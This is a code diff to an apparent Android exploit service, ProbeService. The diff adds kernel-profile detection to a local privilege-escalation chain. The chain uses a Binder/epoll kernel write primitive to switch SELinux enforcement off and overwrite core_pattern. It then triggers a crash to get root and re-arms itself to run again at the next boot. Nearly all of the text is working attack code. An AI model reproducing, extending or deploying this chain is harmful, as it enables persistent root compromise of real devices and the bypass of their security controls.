@@ -41,7 +41,8 @@ public final class ProbeService extends Service {
     private static native int nativePendingSelfBinder(int handle);
     private static native int nativePinCpuZero();
     private static native String nativeComposeHeldPacketAfterPending(
-        int handle, int expectedBinderFd, int targetMode, String executable);
+        int handle, int expectedBinderFd, int targetMode, int profileId,
+        String executable);
 
     private File extractExecutable(String assetName) throws Exception {
         File executable = new File(getFilesDir(), assetName);
@@ -71,7 +72,7 @@ public final class ProbeService extends Service {
     /* Keep the separate Binder endpoint pending while the native primitive
      * registers and removes its two stale epoll entries. The native function
      * accepts only mode 5 (SELinux word) or mode 3 (core_pattern) here. */
-    private String composeOnOwnBinder(int targetMode) {
+    private String composeOnOwnBinder(int targetMode, KernelProfile profile) {
         int pinned = nativePinCpuZero();
         if (pinned != 0) return "cpu_pin_errno_" + (-pinned);
 
@@ -99,7 +100,7 @@ public final class ProbeService extends Service {
             int pending = handle > 0 ? nativePendingSelfBinder(handle) : -99;
             String result = pending >= 1000 && handle > 0
                 ? nativeComposeHeldPacketAfterPending(handle, pending - 1000,
-                                                      targetMode, receiver.getAbsolutePath())
+                    targetMode, profile.id, receiver.getAbsolutePath())
                 : "not_requested";
             return "remote_class_" + remote[0].getClass().getName()
                 + "_object_0x" + Long.toHexString(object)
@@ -118,12 +119,12 @@ public final class ProbeService extends Service {
                 + "cleanup_peek8_4f52494744415441_pop_equal_1");
     }
 
-    private String composeWithBoundedRetries(int targetMode) {
-        String result = composeOnOwnBinder(targetMode);
+    private String composeWithBoundedRetries(int targetMode, KernelProfile profile) {
+        String result = composeOnOwnBinder(targetMode, profile);
         int attempt = 1;
         while (attempt < 8 && retryable(result)) {
             attempt++;
-            result = composeOnOwnBinder(targetMode);
+            result = composeOnOwnBinder(targetMode, profile);
         }
         return "attempts_" + attempt + "_final_" + result;
     }
@@ -215,17 +216,22 @@ public final class ProbeService extends Service {
     }
 
     private void runColdBoot(String source) {
+        KernelProfile profile = KernelProfile.detect();
+        if (profile == null) {
+            Log.e(TAG, "KERNEL_PROFILE_UNKNOWN: no kernel write attempted");
+            return;
+        }
         String initialEnforcing = readSmallFile("/sys/fs/selinux/enforce");
 
         // 1. A verified short write changes only the checked enforcing word.
-        String first = composeWithBoundedRetries(5);
+        String first = composeWithBoundedRetries(5, profile);
         String second = "stage1_not_valid";
         String crash = "not_requested";
         if (first.contains("compose_mode_5_") &&
             first.contains("_valid_1_tid_") &&
             "0".equals(readSmallFile("/sys/fs/selinux/enforce"))) {
             // 2. Repeat the primitive against the checked core_pattern word.
-            second = composeWithBoundedRetries(3);
+            second = composeWithBoundedRetries(3, profile);
             if (second.contains("compose_mode_3_") &&
                 second.contains("_valid_1_tid_"))
                 // 3. Only the verified pipe target permits a child crash.
@@ -251,7 +257,8 @@ public final class ProbeService extends Service {
         String rearm = rootConfirmed ? armNextBoot() : "not_confirmed";
         String earlyGate = rootConfirmed
             ? EarlyWifiGate.releaseAfterConfirmedRoot(this) : "root_not_confirmed";
-        String line = "source=" + source + " uid=" + Process.myUid()
+        String line = "source=" + source + " kernel_profile=" + profile.id
+            + " uid=" + Process.myUid()
             + " initial_enforcing=" + initialEnforcing
             + " stage1=" + first + " stage2=" + second
             + " child=" + crash + " helper=" + bridge
